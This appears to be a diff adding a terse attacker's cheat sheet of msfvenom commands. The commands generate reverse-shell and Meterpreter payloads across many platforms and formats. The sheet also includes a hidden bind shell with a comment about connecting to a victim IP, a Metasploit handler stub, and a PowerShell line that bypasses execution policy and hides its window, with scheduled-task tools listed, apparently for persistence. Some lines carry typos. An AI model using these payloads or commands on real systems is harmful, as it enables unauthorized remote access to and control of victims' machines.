@@ -1,0 +1,41 @@
+Linux
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=localip LPORT=localport -f elf > shell.elf
+
+Windows
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=localip LPORT=localport -f exe > shell.exe
+msfvenom -p windows/x64/powershell_reverse_tcp LHOST= LPORT=31242 -f raw > shell.bat
+
+Mac
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=localip LPORT=localport -f macho > shell.macho
+
+PHP
+msfvenom -p php/meterpreter_reverse_tcp LHOST=localip LPORT=localport -f raw > shell.php
+cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+
+ASP
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=localip LPORT=localport -f asp > shell.asp
+
+JSP
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=localip LPORT=localport -f raw > shell.jsp
+
+WAR
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=localip LPORT=localport -f war > shell.war
+
+Python
+msfvenom -p cmd/unix/reverse_python LHOST=localip LPORT=localport -f raw > shell.py
+
+Bash
+msfvenom -p cmd/unix/reverse_bash LHOST=localip LPORT=localport -f raw > shell.sh     
+
+Perl
+msfvenom -p cmd/unix/reverse_perl LHOST=localip LPORT=localport -f raw > shell.pl 
+ 
+msfvenom -p windows/shell_hidden_bind_tcp LPORT=8889 AHOST=192.168.52.129 -f exe > hidden_shell.exe  在 192.168.52.129连接受害者IP
+use exploit/mulit/handler
+set payload windows///
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive —NoProfile -WindowStyle Hidden —File "C:\do_neat_ps_shit.ps1"
+
+
+taskschd.msc
+taskmgr
+schtasks
